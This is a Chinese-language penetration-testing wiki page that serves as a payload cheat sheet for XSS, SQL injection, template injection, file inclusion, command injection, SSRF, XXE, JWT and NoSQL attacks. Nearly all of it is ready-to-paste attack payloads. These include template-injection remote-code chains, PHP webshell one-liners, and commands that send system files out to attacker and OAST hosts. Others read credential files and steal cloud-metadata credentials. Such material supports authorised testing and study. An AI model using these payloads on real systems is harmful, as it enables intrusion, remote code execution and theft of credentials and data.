---
type: wiki
category: attack
tool: payloads
status: active
last-updated: 2026-04-21
---

# Payload 速查冊（XSS / SQLi / SSTI / LFI / CmdInj）

> **用途：** 手動測試時的 payload 口袋本。按框架 / DB / 情境分類，降低 trial-and-error。
> 所有 payload 可貼進 Burp Repeater / Caido Replay / curl / sqlmap --tamper。

## XSS

### 通用 polyglot（單一 payload 命中最多 context）

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Polyglot 2（Gareth Heyes）：

```
"><img src=x onerror=alert(1)>
```

Polyglot 3（OOXMN）：

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

### Context-based

| Context | Payload |
|---------|---------|
| HTML body | `<img src=x onerror=alert(1)>` |
| HTML body (no `<`) | `&#60;img src=x onerror=alert(1)&#62;` |
| Attribute (no quote) | ` onmouseover=alert(1) a=` |
| Attribute (double quote) | `" onmouseover=alert(1) x="` |
| Attribute (href/src) | `javascript:alert(1)` |
| JS string (double quote) | `";alert(1);//` |
| JS string (single quote) | `';alert(1);//` |
| JS template literal | `${alert(1)}` |
| CSS | `</style><img src=x onerror=alert(1)>` |
| Filter: `<script` blocked | `<svg onload=alert(1)>` / `<details open ontoggle=alert(1)>` |
| Filter: `on*` blocked | `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` |
| Filter: `alert` blocked | `[].constructor.constructor('alert(1)')()` |
| Filter: `()` blocked | `` alert`1` `` |
| Filter: `' " <` 都 encode | `javascript:alert(1)` in href / form action |

### DOM XSS

```js
// 常見 sink
location.hash / location.search / location.href
document.write / document.writeln
innerHTML / outerHTML
eval / setTimeout / setInterval / Function
jQuery.html / jQuery.append
postMessage (onmessage handler)

// Source
https://target.com/#<img src=x onerror=alert(1)>
https://target.com/?q=<img src=x onerror=alert(1)>
```

### CSP bypass（常見）

```html
<!-- script-src 'self' 的繞過 -->
<!-- 如果有同源 JSONP endpoint -->
<script src="https://target.com/api/jsonp?callback=alert(1)//"></script>

<!-- 如果有 AngularJS 1.x -->
<div ng-app ng-csp id=p ng-click=$event.view.alert(1)>

<!-- base URI 未限制 -->
<base href="https://evil.com/"><script src="x.js"></script>
```

## SQL Injection

### 判斷 DB 類型（無 sqlmap）

```sql
-- MySQL/MariaDB
' AND 1=1 AND @@version LIKE '5%' --
' AND SLEEP(5) --
' UNION SELECT @@version --

-- MSSQL
' AND 1=(SELECT @@version) --
' WAITFOR DELAY '0:0:5' --

-- PostgreSQL
' AND 1=(SELECT version()) --
' AND pg_sleep(5) --

-- Oracle
' AND 1=(SELECT banner FROM v$version WHERE ROWNUM=1) --
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1 --

-- SQLite
' AND 1=(SELECT sqlite_version()) --

-- 通用確認
' OR 1=1 --
' OR '1'='1
') OR 1=1 --
```

### UNION-based

```sql
-- 1. 找欄位數
' ORDER BY 1 --
' ORDER BY 10 --
' ORDER BY 5 -- ← 如果這個沒 error 就是 5 欄

-- 2. 找 reflect 位置
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 'a','b','c','d','e' --

-- 3. 抓資料
' UNION SELECT 1,user(),database(),version(),5 --
' UNION SELECT 1,table_name,NULL,NULL,NULL FROM information_schema.tables --
' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
```

### Blind boolean

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
' AND (SELECT COUNT(*) FROM users)>0 --
' AND (SELECT IF(1=1,SLEEP(5),0)) --  -- time-based fallback
```

### Error-based（MySQL）

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
' AND updatexml(1,concat(0x7e,(SELECT user())),1) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

### WAF bypass 組合

見 [14-waf-bypass-commands.md](14-waf-bypass-commands.md) § sqlmap tamper。

手動：

```sql
-- 空白替代
/**/  /*!*/  %09(tab)  %0a(LF)  +
-- UNION SELECT → UNI/**/ON SELECT
-- SLEEP(5) → /*!SLEEP*/(5)

-- 關鍵字拆分（MySQL）
UN/**/ION/**/SE/**/LECT
UnIoN SeLeCt

-- 編碼
%252f%252a (double URL encode)
CHAR(72,69,76,76,79) → "HELLO"
0x48454c4c4f → "HELLO"
```

## SSTI（Server-Side Template Injection）

### 偵測（通用）

```
{{7*7}}       → 49（Jinja2/Twig/Nunjucks）
${7*7}        → 49（Freemarker/Velocity/Mako）
<%= 7*7 %>    → 49（ERB/JSP）
#{7*7}        → 49（Pug/Ruby）
{7*7}         → 49（某些老引擎）

# 區分 Jinja2 vs Twig
{{7*'7'}}
  → 7777777 = Jinja2
  → 49 = Twig
```

### Jinja2 (Python)

```python
# Version
{{config}}
{{ self.__dict__ }}

# RCE via class
{{ ''.__class__.__mro__[1].__subclasses__() }}  # 列 class
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('id').read() }}

# 常用
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}  // Twig >= 1.19
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```
#set($x = "")##
#set($rt = $x.class.forName("java.lang.Runtime"))##
#set($chr = $x.class.forName("java.lang.Character"))##
#set($str = $x.class.forName("java.lang.String"))##
#set($ex = $rt.getRuntime().exec("id"))##
$ex.waitFor()
#set($out = $ex.getInputStream())
```

### ERB (Ruby)

```ruby
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
```

### Smarty (PHP)

```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### tplmap（自動化）

```bash
pip install tplmap
tplmap -u "https://target.com/page?name=FUZZ"
tplmap -u "https://target.com/page" -d "name=FUZZ"
```

## LFI / Path Traversal

### 通用

```
# 基本
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f  (double encode)

# Null byte（老 PHP）
../../../etc/passwd%00
../../../etc/passwd%00.png

# Filter bypass
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..\/..\/..\/etc\/passwd

# UTF-8 overlong
%c0%ae%c0%ae/  (= ..)
```

### Linux 常讀

```
/etc/passwd
/etc/shadow             # 需 root
/etc/hosts
/etc/issue
/proc/self/environ      # 含 env vars（常有 secrets）
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0..       # 開啟的 fd
/proc/net/tcp           # 內部連線
/root/.bash_history
/root/.ssh/id_rsa
/home/<user>/.bash_history
/home/<user>/.ssh/id_rsa
/var/log/apache2/access.log  # log poisoning
/var/log/auth.log
/var/log/nginx/access.log
/var/www/html/config.php
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\inetsrv\MetaBase.xml
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
..\..\..\Windows\System32\drivers\etc\hosts
```

### PHP wrapper（RCE chain）

```
php://filter/convert.base64-encode/resource=index.php   → base64 source code
php://filter/read=convert.base64-encode/resource=../config.php
php://input  + POST body = <?php system($_GET[c]); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
zip:///tmp/evil.zip%23shell
```

### Log poisoning

```
1. User-Agent: <?php system($_GET['c']); ?>
2. LFI include /var/log/apache2/access.log?c=id
   → 執行
```

## Command Injection

### 基本

```bash
# 一般
; id
| id
& id
&& id
|| id
`id`
$(id)

# Windows
& whoami
&& whoami
| whoami
```

### Filter bypass

```bash
# 空白
{id,}
$IFS$9id
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd' && $X

# 關鍵字拆分
c''a''t /etc/passwd
c\a\t /etc/passwd
/bin/c?t /etc/passwd
/???/c?t /etc/??sswd
cat `echo -e "/etc/pa\x73swd"`

# 無輸出通道（blind）
`curl http://attacker/$(id)`
`nslookup $(whoami).attacker.com`
`ping -c 1 $(id|xxd -p).attacker.com`
```

### Out-of-band（OAST）

```bash
# Burp Collaborator / Interactsh
interactsh-client

# Payload
`curl $(id | base64).xxx.oast.pro`
`nslookup $(whoami).xxx.oast.pro`
`wget https://xxx.oast.pro/$(cat /etc/passwd | base64 -w0)`
```

## SSRF

### 基本探測

```
http://127.0.0.1:80/
http://localhost/
http://0.0.0.0/
http://0/
http://[::1]/

# IP 編碼
http://2130706433/           # 127.0.0.1 as int
http://0x7f000001/           # hex
http://0177.0.0.1/           # octal

# DNS rebinding
http://attacker-controlled-dns/   # TTL=0, alternates 127.0.0.1/attacker

# 繞 "127.0.0.1" blocklist
http://127.1/
http://127.0.1/
```

### Cloud metadata（最常被 payout）

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data

# AWS IMDSv2（需要 token）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
curl http://169.254.169.254/metadata/v1/
```

### 其他內部服務

```
http://127.0.0.1:6379/   Redis
http://127.0.0.1:5984/   CouchDB
http://127.0.0.1:27017/  MongoDB
http://127.0.0.1:9200/   Elasticsearch
http://127.0.0.1:8500/   Consul
http://127.0.0.1:2375/   Docker API
http://127.0.0.1:10250/  Kubelet
http://127.0.0.1:8080/   Jenkins / 一般 dev server
```

### Protocol smuggling

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:25/_MAIL%20FROM:...  (SMTP smuggling)
file:///etc/passwd
dict://127.0.0.1:11211/stat
```

## XXE

```xml
<!-- 外部實體 -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- SSRF chain -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker/"> ]>

<!-- Blind OOB -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker/xxe.dtd">
  %xxe;
]>

<!-- 外部 xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval;
%exfil;

<!-- PHP wrapper -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

## JWT

見 [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 10-11。

```bash
# 快速 alg=none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"sub":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-'
# JWT = header.payload.  (空 signature)

# Weak secret brute
hashcat -m 16500 jwt.txt rockyou.txt
```

## NoSQL Injection

### MongoDB

```js
// login bypass
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":"admin","password":{"$gt":""}}

// URL form
username[$ne]=null&password[$ne]=null

// RCE (old versions)
{"$where":"function(){sleep(5000); return true;}"}
```

## 關聯文件

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) — payload encoding + WAF bypass
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) — 自動化對應
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md)
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md)
- [29-tool-sqlmap.md](29-tool-sqlmap.md)
- [25-tool-dalfox.md](25-tool-dalfox.md)

## 外部 payload 集合

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- SecLists: https://github.com/danielmiessler/SecLists
- HackTricks: https://book.hacktricks.wiki
- OWASP Cheatsheet Series: https://cheatsheetseries.owasp.org
